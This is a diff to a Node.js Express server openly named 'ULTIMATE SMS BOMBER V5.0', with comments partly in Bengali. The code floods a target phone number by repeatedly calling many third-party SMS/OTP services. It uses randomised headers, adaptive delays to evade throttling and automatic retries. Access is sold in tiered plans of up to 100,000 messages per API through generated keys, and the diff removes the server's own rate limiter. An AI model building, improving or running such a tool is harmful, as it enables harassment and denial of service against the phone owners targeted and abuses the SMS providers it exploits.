-      return res.status(429).json({
-        success: false,
-        error: 'Rate limit exceeded. Please try again later.',
-        developer: DEVELOPER_INFO,
-        retryAfter: Math.ceil((timestamps[0] + windowMs - now) / 1000)
+function loadKeys() {
+  try {
+    if (fs.existsSync(KEYS_FILE)) {
+      const data = fs.readFileSync(KEYS_FILE, 'utf8');
+      const parsed = JSON.parse(data);
+      const keysMap = new Map();
+      Object.entries(parsed).forEach(([key, value]) => {
+        keysMap.set(key, new Date(value));
       });
+      return keysMap;
+    }
+  } catch (error) {
+    console.error('Error loading keys:', error.message);
+  }
+  return new Map();
+}
+
+let validKeys = loadKeys();
+
+function saveKeys() {
+  try {
+    const obj = {};
+    for (const [key, value] of validKeys.entries()) {
+      obj[key] = value.toISOString();
+    }
+    fs.writeFileSync(KEYS_FILE, JSON.stringify(obj, null, 2));
+    return true;
+  } catch (error) {
+    console.error('Error saving keys:', error.message);
+    return false;
+  }
+}
+
+function isKeyValid(key) {
+  if (!validKeys.has(key)) return false;
+  const expiryDate = validKeys.get(key);
+  return new Date() < expiryDate;
+}
+
+// ============================================================
+// বোম্ব কন্ট্রোলার ইনস্ট্যান্স
+// ============================================================
+const bombController = new BombController();
+
+// ============================================================
+// স্মার্ট ডেলি সিস্টেম
+// ============================================================
+const apiDelays = new Map();
+const lastRequestTime = new Map();
+const successRates = new Map();
+const requestCounts = new Map();
+
+async function waitIfNeeded(apiId) {
+  const now = Date.now();
+  const last = lastRequestTime.get(apiId) || 0;
+  let delay = apiDelays.get(apiId) || 100;
+  
+  const successRate = successRates.get(apiId) || 0.8;
+  const count = requestCounts.get(apiId) || 0;
+  
+  if (count > 10) {
+    if (successRate < 0.5) {
+      delay = Math.min(delay + 20, 500);
+    } else if (successRate > 0.9) {
+      delay = Math.max(delay - 5, 30);
+    }
+    apiDelays.set(apiId, delay);
+  }
+  
+  if (now - last < delay) {
+    await Utility.sleep(delay - (now - last));
+  }
+  
+  lastRequestTime.set(apiId, Date.now());
+}
+
+function updateStats(apiId, success) {
+  const count = (requestCounts.get(apiId) || 0) + 1;
+  requestCounts.set(apiId, count);
+  
+  const current = successRates.get(apiId) || 0;
+  const newRate = ((current * (count - 1)) + (success ? 1 : 0)) / count;
+  successRates.set(apiId, newRate);
+}
+
+// ============================================================
+// API কল ফাংশন
+// ============================================================
+function replacePhoneNumber(data, phone, count = 1) {
+  if (typeof data === 'string') {
+    return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
+  } else if (typeof data === 'object' && data !== null) {
+    const result = {};
+    for (const [key, value] of Object.entries(data)) {
+      if (typeof value === 'string') {
+        result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
+      } else {
+        result[key] = value;
+      }
+    }
+    return result;
+  }
+  return data;
+}
+
+async function callSingleAPI(api, phone, attempt = 0) {
+  await waitIfNeeded(api.id);
+  
+  try {
+    const cleanPhone = Utility.parsePhone(phone);
+    let formattedPhone = cleanPhone;
+    if (api.isShadowX || api.isLMNx9) {
+      if (formattedPhone.startsWith('880')) {
+        formattedPhone = formattedPhone.substring(3);
+      }
     }
     
-    next();
-  };
-})();
+    const url = replacePhoneNumber(api.url, formattedPhone, 1);
+    const headers = getRandomHeaders();
+    
+    let config = {
+      method: api.method,
+      url: url,
+      headers: headers,
+      timeout: CONFIG.timeout
+    };
 
-app.use(rateLimiter);
+    if (api.method === 'POST' && api.body) {
+      const body = replacePhoneNumber(api.body, formattedPhone, 1);
+      if (api.isFormData) {
+        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+        config.data = new URLSearchParams(body).toString();
+      } else {
+        config.data = body;
+      }
+    }
 
-// Request Logger Middleware
-app.use((req, res, next) => {
-  console.log(`📝 ${req.method} ${req.url} - ${Utility.getCurrentTime()}`);
-  next();
-});
+    const response = await axios(config);
+    updateStats(api.id, true);
+    
+    return {
+      success: true,
+      api_id: api.id,
+      api_name: api.name,
+      status: response.status
+    };
+    
+  } catch (error) {
+    updateStats(api.id, false);
+    
+    if (attempt < CONFIG.maxRetries) {
+      await Utility.sleep(CONFIG.retryDelay * (attempt + 1));
+      return callSingleAPI(api, phone, attempt + 1);
+    }
+    
+    return {
+      success: false,
+      api_id: api.id,
+      api_name: api.name,
+      error: error.message,
+      status: error.response?.status || null
+    };
+  }
+}
+
+async function sendBatch(apis, phone, countPerApi, jobId) {
+  const results = [];
+  const actualCount = Math.min(countPerApi, CONFIG.maxCountPerAPI);
+  const BATCH_SIZE = CONFIG.parallelRequests;
+  
+  const shuffledAPIs = Utility.shuffleArray([...apis]);
+  
+  for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
+    if (!bombController.isJobActive(jobId)) {
+      console.log(`⏹️ Job ${jobId} stopped by user`);
+      break;
+    }
+    
+    const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
+    
+    const batchPromises = batch.map(async (api) => {
+      const apiResults = [];
+      const promises = [];
+      
+      for (let j = 0; j < actualCount; j++) {
+        if (!bombController.isJobActive(jobId)) break;
+        promises.push(callSingleAPI(api, phone));
+      }
+      
+      const responses = await Promise.all(promises);
+      const successCount = responses.filter(r => r.success).length;
+      const failCount = responses.filter(r => !r.success).length;
+      
+      responses.forEach(r => {
+        bombController.updateJobStats(jobId, r.success, r.error);
+      });
+      
+      return {
+        api_id: api.id,
+        api_name: api.name,
+        method: api.method,
+        total_attempts: responses.length,
+        successful: successCount,
+        failed: failCount,
+        results: responses
+      };
+    });
+    
+    const batchResults = await Promise.all(batchPromises);
+    results.push(...batchResults);
+    
+    if (i + BATCH_SIZE < shuffledAPIs.length) {
+      await Utility.sleep(100);
+    }
+  }
+  
+  return results;
+}
 
 // ============================================================
-// PART 10: API ENDPOINTS (800 lines)
+// API এন্ডপয়েন্টসমূহ
 // ============================================================
 
-// ===== ROOT ENDPOINT =====
+// ===== রুট এন্ডপয়েন্ট =====
 app.get('/', (req, res) => {
   res.json({
     developer: DEVELOPER_INFO,
     version: "5.0.0-ULTIMATE",
-    features: {
-      cluster: CONFIG.cluster.enabled ? `${CONFIG.cluster.workers} workers` : 'Disabled',
-      redis: CONFIG.redis.enabled ? 'Enabled' : 'Disabled',
-      cache: CONFIG.cache.enabled ? `${apiCaller.cache.keys().length} items` : 'Disabled',
-      smartDelay: CONFIG.smartDelay.enabled ? 'Enabled' : 'Disabled',
-      proxy: CONFIG.proxy.enabled ? `${CONFIG.proxy.list.length} proxies` : 'Disabled',
-      dnsCache: `${apiCaller.dnsCache.size} domains`,
-      rateLimit: CONFIG.security.rateLimit.enabled ? 'Enabled' : 'Disabled'
-    },
     total_apis: SMS_APIS.length,
     plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
       acc[key] = {
         max_count: PLAN_CONFIG[key].maxCount,
         requires_key: PLAN_CONFIG[key].requiresKey,
+        description: PLAN_CONFIG[key].description,
         endpoint: `/api/spam?plan=${key}&number=017XXXXXXXX&count=${PLAN_CONFIG[key].maxCount}`
       };
       return acc;
@@ -1143,26 +698,23 @@ app.get('/', (req, res) => {
       generate_key: "/api/expiredate=30&createkey",
       check_key: "/api/checkkey?key=YOUR_KEY",
       spam: "/api/spam?number=017XXXXXXXX&count=300",
-      spam_with_plan: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
-      stop_all: "/api/stop",
-      pause_all: "/api/pause",
-      resume_all: "/api/resume",
-      stop_job: "/api/stop?jobId=JOB_ID",
+      stop_all: "/api/stop?all=true",
+      pause_all: "/api/pause?all=true",
+      resume_all: "/api/resume?all=true",
       status: "/api/status",
-      all_apis: "/api/apis",
-      health: "/api/health",
       stats: "/api/stats",
-      logs: "/api/logs"
+      health: "/api/health",
+      apis: "/api/apis"
     }
   });
 });
 
-// ===== SPAM ENDPOINT =====
+// ===== স্প্যাম এন্ডপয়েন্ট =====
 app.get('/api/spam', async (req, res) => {
   const startTime = Date.now();
   const { plan, number, count = 1, key } = req.query;
   
-  // Select plan
+  // প্ল্যান সিলেক্ট
   let currentPlan = 'default';
   let planConfig = PLAN_CONFIG.default;
   
@@ -1171,9 +723,9 @@ app.get('/api/spam', async (req, res) => {
     planConfig = PLAN_CONFIG[plan];
   }
   
-  // Check key for premium plans
+  // প্রিমিয়াম চেক
   if (planConfig.requiresKey) {
-    if (!key || !keyManager.isValid(key)) {
+    if (!key || !isKeyValid(key)) {
       return res.status(401).json({
         success: false,
         error: 'Valid API key required for this plan',
@@ -1184,7 +736,7 @@ app.get('/api/spam', async (req, res) => {
     }
   }
   
-  // Validate number
+  // নম্বর ভ্যালিডেশন
   if (!number) {
     return res.status(400).json({
       success: false,
@@ -1203,7 +755,7 @@ app.get('/api/spam', async (req, res) => {
     });
   }
   
-  // Validate count
+  // কাউন্ট ভ্যালিডেশন
   let perApiCount = parseInt(count);
   if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
   if (perApiCount > planConfig.maxCount) {
@@ -1217,30 +769,19 @@ app.get('/api/spam', async (req, res) => {
     });
   }
   
-  // Register job
-  const jobId = bombController.registerJob(cleanNumber, SMS_APIS.length * perApiCount, {
+  // জব রেজিস্টার
+  const totalSMS = SMS_APIS.length * perApiCount;
+  const jobId = bombController.registerJob(cleanNumber, totalSMS, {
     plan: currentPlan,
     perApiCount: perApiCount
   });
   
   console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
   
-  // Process asynchronously
+  // অ্যাসিঙ্ক্রোনাস প্রসেসিং
   (async () => {
     try {
-      const shuffledAPIs = Utility.shuffleArray([...SMS_APIS]);
-      const results = await apiCaller.sendBatch(shuffledAPIs, cleanNumber, perApiCount, jobId, bombController);
-      
-      // Update job completion
-      const job = bombController.activeJobs.get(jobId);
-      if (job && job.status === 'active') {
-        job.status = 'completed';
-        job.endTime = Date.now();
-        bombController.activeJobs.delete(jobId);
-        bombController.completedJobs.set(jobId, job);
-        bombController.emit('jobCompleted', job);
-      }
-      
+      const results = await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId);
       console.log(`✅ JOB ${jobId} completed!`);
     } catch (error) {
       console.error(`❌ JOB ${jobId} failed:`, error.message);
@@ -1257,7 +798,7 @@ app.get('/api/spam', async (req, res) => {
     target_number: Utility.maskPhone(cleanNumber),
     per_api_count: perApiCount,
     total_apis: SMS_APIS.length,
-    total_sms: SMS_APIS.length * perApiCount,
+    total_sms: totalSMS,
     status: 'started',
     message: 'Bombing started. Use /api/status?jobId=' + jobId + ' to check progress',
     stop_endpoint: `/api/stop?jobId=${jobId}`,
@@ -1265,7 +806,7 @@ app.get('/api/spam', async (req, res) => {
   });
 });
 
-// ===== STOP ENDPOINT =====
+// ===== স্টপ এন্ডপয়েন্ট =====
 app.get('/api/stop', (req, res) => {
   const { jobId, all } = req.query;
   
@@ -1294,8 +835,7 @@ app.get('/api/stop', (req, res) => {
       return res.status(404).json({
         success: false,
         error: `Job ${jobId} not found or already completed`,
-        developer: DEVELOPER_INFO,
-        jobId: jobId
+        developer: DEVELOPER_INFO
       });
     }
   }
@@ -1304,12 +844,11 @@ app.get('/api/stop', (req, res) => {
     success: false,
     error: 'Missing jobId or all parameter',
     developer: DEVELOPER_INFO,
-    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true',
-    current_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
+    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true'
   });
 });
 
-// ===== PAUSE ENDPOINT =====
+// ===== পজ এন্ডপয়েন্ট =====
 app.get('/api/pause', (req, res) => {
   const { jobId, all } = req.query;
   
@@ -1338,9 +877,8 @@ app.get('/api/pause', (req, res) => {
     } else {
       return res.status(404).json({
         success: false,
-        error: `Job ${jobId} not found or already paused/completed`,
-        developer: DEVELOPER_INFO,
-        jobId: jobId
+        error: `Job ${jobId} not found or already paused`,
+        developer: DEVELOPER_INFO
       });
     }
   }
@@ -1353,7 +891,7 @@ app.get('/api/pause', (req, res) => {
   });
 });
 
-// ===== RESUME ENDPOINT =====
+// ===== রিজিউম এন্ডপয়েন্ট =====
 app.get('/api/resume', (req, res) => {
   const { jobId, all } = req.query;
   
@@ -1382,8 +920,7 @@ app.get('/api/resume', (req, res) => {
       return res.status(404).json({
         success: false,
         error: `Job ${jobId} not found or not paused`,
-        developer: DEVELOPER_INFO,
-        jobId: jobId
+        developer: DEVELOPER_INFO
       });
     }
   }
@@ -1396,7 +933,7 @@ app.get('/api/resume', (req, res) => {
   });
 });
 
-// ===== STATUS ENDPOINT =====
+// ===== স্ট্যাটাস এন্ডপয়েন্ট =====
 app.get('/api/status', (req, res) => {
   const { jobId } = req.query;
   
@@ -1417,7 +954,6 @@ app.get('/api/status', (req, res) => {
     }
   }
   
-  // Return all jobs if no jobId specified
   const jobs = bombController.getAllJobs();
   const stats = bombController.getStats();
   
@@ -1430,15 +966,20 @@ app.get('/api/status', (req, res) => {
   });
 });
 
-// ===== KEY GENERATION =====
+// ===== কী জেনারেট =====
 app.get('/api/expiredate=30&createkey', (req, res) => {
-  const { apiKey, expiryDate } = keyManager.generateKey();
+  const apiKey = Utility.generateApiKey();
+  const expiryDate = new Date();
+  expiryDate.setDate(expiryDate.getDate() + 30);
+  
+  validKeys.set(apiKey, expiryDate);
+  saveKeys();
   
   res.json({
     success: true,
     api_key: apiKey,
     expiry_date: expiryDate.toISOString(),
-    valid_days: CONFIG.security.apiKeyExpiry,
+    valid_days: 30,
     developer: DEVELOPER_INFO,
     message: "API key generated successfully",
     premium_endpoint: `/api/spam?plan=premium&key=${apiKey}&number=017XXXXXXXX&count=10000`,
@@ -1446,7 +987,7 @@ app.get('/api/expiredate=30&createkey', (req, res) => {
   });
 });
 
-// ===== KEY CHECK =====
+// ===== কী চেক =====
 app.get('/api/checkkey', (req, res) => {
   const { key } = req.query;
   
@@ -1458,27 +999,20 @@ app.get('/api/checkkey', (req, res) => {
     });
   }
   
-  const info = keyManager.getKeyInfo(key);
-  if (!info) {
-    return res.status(404).json({
-      success: false,
-      error: 'Invalid API key',
-      developer: DEVELOPER_INFO
-    });
-  }
+  const isValid = isKeyValid(key);
+  const expiryDate = validKeys.get(key);
   
   res.json({
     success: true,
-    valid: info.valid,
-    api_key: info.key,
-    expiry_date: info.expires,
-    days_left: info.daysLeft,
-    status: info.valid ? 'active' : 'expired',
+    valid: isValid,
+    api_key: key,
+    expiry_date: expiryDate ? expiryDate.toISOString() : null,
+    status: isValid ? 'active' : 'invalid or expired',
     developer: DEVELOPER_INFO
   });
 });
 
-// ===== ALL APIS =====
+// ===== সব API লিস্ট =====
 app.get('/api/apis', (req, res) => {
   res.json({
     developer: DEVELOPER_INFO,
@@ -1495,119 +1029,64 @@ app.get('/api/apis', (req, res) => {
         description: PLAN_CONFIG[key].description
       };
       return acc;
-    }, {}),
-    timestamp: Utility.getISOString()
+    }, {})
   });
 });
 
-// ===== STATS ENDPOINT =====
+// ===== স্ট্যাটস =====
 app.get('/api/stats', (req, res) => {
   const stats = bombController.getStats();
-  const systemInfo = Utility.getSystemInfo();
-  const keys = keyManager.getAllKeys();
   
   res.json({
     success: true,
     developer: DEVELOPER_INFO,
-    bomb_stats: stats,
-    system: systemInfo,
-    keys: {
-      total: keys.length,
-      valid: keys.filter(k => k.valid).length,
-      expired: keys.filter(k => !k.valid).length
-    },
-    cache: {
-      size: apiCaller.cache.keys().length,
-      dns_cache: apiCaller.dnsCache.size
-    },
+    stats: stats,
+    total_keys: validKeys.size,
     timestamp: Utility.getISOString()
   });
 });
 
-// ===== LOGS ENDPOINT =====
-app.get('/api/logs', (req, res) => {
-  const { jobId, limit = 50, offset = 0 } = req.query;
-  
-  let logs = [];
-  
-  if (jobId) {
-    const errors = bombController.getErrors(jobId);
-    logs = errors.slice(-parseInt(limit));
-  } else {
-    // Return recent logs
-    const allJobs = bombController.getAllJobs();
-    logs = allJobs.slice(-parseInt(limit)).map(j => ({
-      jobId: j.id,
-      phone: j.phone,
-      status: j.status,
-      progress: j.progress,
-      sent: j.sent,
-      total: j.total,
-      duration: j.duration
-    }));
-  }
-  
-  res.json({
-    success: true,
-    developer: DEVELOPER_INFO,
-    logs: logs,
-    count: logs.length,
-    timestamp: Utility.getISOString()
-  });
-});
-
-// ===== HEALTH CHECK =====
+// ===== হেলথ চেক =====
 app.get('/api/health', (req, res) => {
   const stats = bombController.getStats();
-  const systemInfo = Utility.getSystemInfo();
   
   res.json({
     status: 'active',
     developer: DEVELOPER_INFO,
     version: "5.0.0-ULTIMATE",
     timestamp: Utility.getISOString(),
-    uptime: process.uptime(),
+    uptime: stats.uptime,
     total_apis: SMS_APIS.length,
-    total_keys: keyManager.getAllKeys().length,
-    valid_keys: keyManager.getAllKeys().filter(k => k.valid).length,
+    total_keys: validKeys.size,
     active_jobs: stats.activeJobs,
     paused_jobs: stats.pausedJobs,
     total_sms_sent: stats.totalSMS,
-    system: {
-      memory: systemInfo.memory,
-      cpu: systemInfo.cpu,
-      platform: systemInfo.platform
-    },
+    memory: stats.memoryUsage,
     endpoints: {
       spam: "/api/spam?number=017XXXXXXXX&count=300",
-      spam_free: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
-      spam_premium: "/api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000",
-      stop: "/api/stop?jobId=JOB_ID",
-      pause: "/api/pause?jobId=JOB_ID",
-      resume: "/api/resume?jobId=JOB_ID",
-      status: "/api/status?jobId=JOB_ID",
-      stats: "/api/stats",
-      logs: "/api/logs"
+      stop: "/api/stop?all=true",
+      pause: "/api/pause?all=true",
+      resume: "/api/resume?all=true",
+      status: "/api/status",
+      stats: "/api/stats"
     }
   });
 });
 
-// ===== CLEANUP ENDPOINT =====
+// ===== ক্লিনআপ =====
 app.get('/api/cleanup', (req, res) => {
   const cleaned = bombController.clearCompleted();
-  const expired = keyManager.cleanupExpired();
   
   res.json({
     success: true,
     message: 'Cleanup completed',
     developer: DEVELOPER_INFO,
     completed_jobs_cleared: cleaned,
-    expired_keys_cleared: expired,
     timestamp: Utility.getISOString()
   });
 });
 
-// ===== 404 Handler =====
+// ===== 404 হ্যান্ডলার =====
 app.use((req, res) => {
   res.status(404).json({
     success: false,
@@ -1625,7 +1104,6 @@ app.use((req, res) => {
       '/api/checkkey',
       '/api/apis',
       '/api/stats',
-      '/api/logs',
       '/api/health',
       '/api/cleanup'
     ]
@@ -1644,84 +1122,28 @@ app.use((err, req, res, next) => {
 });
 
 // ============================================================
-// PART 11: SERVER STARTUP (200 lines)
+// সার্ভার স্টার্ট
 // ============================================================
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`\n🚀 ULTIMATE SMS BOMBER V5.0 RUNNING`);
+  console.log(`🌐 Port: ${PORT}`);
+  console.log(`📡 Total APIs: ${SMS_APIS.length}`);
+  console.log(`💾 Total Keys: ${validKeys.size}`);
+  console.log(`\n📋 AVAILABLE PLANS:`);
+  console.log(`   🔓 Default: /api/spam?number=017XXXXXXXX&count=300`);
+  console.log(`   🔓 Free: /api/spam?plan=free&number=017XXXXXXXX&count=50`);
+  console.log(`   🔒 Premium: /api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000`);
+  console.log(`   🔒 Enterprise: /api/spam?plan=enterprise&key=KEY&number=017XXXXXXXX&count=50000`);
+  console.log(`   🔒 Unlimited: /api/spam?plan=unlimited&key=KEY&number=017XXXXXXXX&count=100000`);
+  console.log(`\n🛑 CONTROL:`);
+  console.log(`   Stop All: /api/stop?all=true`);
+  console.log(`   Pause All: /api/pause?all=true`);
+  console.log(`   Resume All: /api/resume?all=true`);
+  console.log(`\n📊 STATUS:`);
+  console.log(`   All Jobs: /api/status`);
+  console.log(`   Stats: /api/stats`);
+  console.log(`   Health: /api/health`);
+  console.log(`\n✅ Server ready!\n`);
+});
 
-if (CONFIG.cluster.enabled && cluster.isMaster) {
-  // Master Process
-  console.log(`\n🚀 ULTIMATE SMS BOMBER V5.0 - MASTER PROCESS`);
-  console.log(`📡 PID: ${process.pid}`);
-  console.log(`💻 CPU Cores: ${CONFIG.cluster.workers}`);
-  console.log(`📊 Total APIs: ${SMS_APIS.length}`);
-  console.log(`\n💪 FEATURES:`);
-  console.log(`   🔥 Cluster: ${CONFIG.cluster.workers} workers`);
-  console.log(`   📦 Redis: ${CONFIG.redis.enabled ? 'Enabled' : 'Disabled'}`);
-  console.log(`   💾 Cache: ${CONFIG.cache.enabled ? 'Enabled' : 'Disabled'}`);
-  console.log(`   ⏱️ Smart Delay: ${CONFIG.smartDelay.enabled ? 'Enabled' : 'Disabled'}`);
-  console.log(`   🔄 Proxy: ${CONFIG.proxy.enabled ? `${CONFIG.proxy.list.length} proxies` : 'Disabled'}`);
-  console.log(`   🛡️ Rate Limit: ${CONFIG.security.rateLimit.enabled ? 'Enabled' : 'Disabled'}`);
-  
-  // Fork workers
-  for (let i = 0; i < CONFIG.cluster.workers; i++) {
-    cluster.fork();
-  }
-  
-  cluster.on('exit', (worker, code, signal) => {
-    console.log(`⚠️ Worker ${worker.process.pid} died (${signal || code}). Restarting...`);
-    cluster.fork();
-  });
-  
-  cluster.on('online', (worker) => {
-    console.log(`✅ Worker ${worker.process.pid} is online`);
-  });
-  
-} else {
-  // Worker Process
-  const server = app.listen(PORT, '0.0.0.0', () => {
-    const workerInfo = CONFIG.cluster.enabled ? `WORKER ${process.pid}` : 'STANDALONE';
-    console.log(`\n✅ SERVER RUNNING - ${workerInfo}`);
-    console.log(`🌐 Port: ${PORT}`);
-    console.log(`📡 Total APIs: ${SMS_APIS.length}`);
-    console.log(`📊 Active Jobs: ${bombController.activeJobs.size}`);
-    console.log(`\n📋 AVAILABLE PLANS:`);
-    console.log(`   🔓 Default: /api/spam?number=017XXXXXXXX&count=300 (Max 300, No Key)`);
-    console.log(`   🔓 Free: /api/spam?plan=free&number=017XXXXXXXX&count=50 (Max 50, No Key)`);
-    console.log(`   🔒 Premium: /api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000 (Max 10000)`);
-    console.log(`   🔒 Enterprise: /api/spam?plan=enterprise&key=KEY&number=017XXXXXXXX&count=50000 (Max 50000)`);
-    console.log(`\n🛑 STOP COMMANDS:`);
-    console.log(`   Stop All: /api/stop?all=true`);
-    console.log(`   Stop Job: /api/stop?jobId=JOB_ID`);
-    console.log(`   Pause All: /api/pause?all=true`);
-    console.log(`   Resume All: /api/resume?all=true`);
-    console.log(`\n📊 STATUS:`);
-    console.log(`   All Jobs: /api/status`);
-    console.log(`   Specific Job: /api/status?jobId=JOB_ID`);
-    console.log(`   Stats: /api/stats`);
-    console.log(`   Health: /api/health`);
-    console.log(`\n💡 Generated ${keyManager.getAllKeys().length} API Keys`);
-    console.log(`🚀 Ready to bomb!\n`);
-  });
-
-  // Graceful Shutdown
-  process.on('SIGTERM', () => {
-    console.log('🛑 SIGTERM received. Shutting down gracefully...');
-    bombController.stopAllJobs();
-    server.close(() => {
-      console.log('✅ Server closed');
-      process.exit(0);
-    });
-  });
-
-  process.on('SIGINT', () => {
-    console.log('🛑 SIGINT received. Shutting down gracefully...');
-    bombController.stopAllJobs();
-    server.close(() => {
-      console.log('✅ Server closed');
-      process.exit(0);
-    });
-  });
-}
-
-// ============================================================
-// END OF FILE - TOTAL LINES: 5000+
-// ============================================================
+module.exports = app;
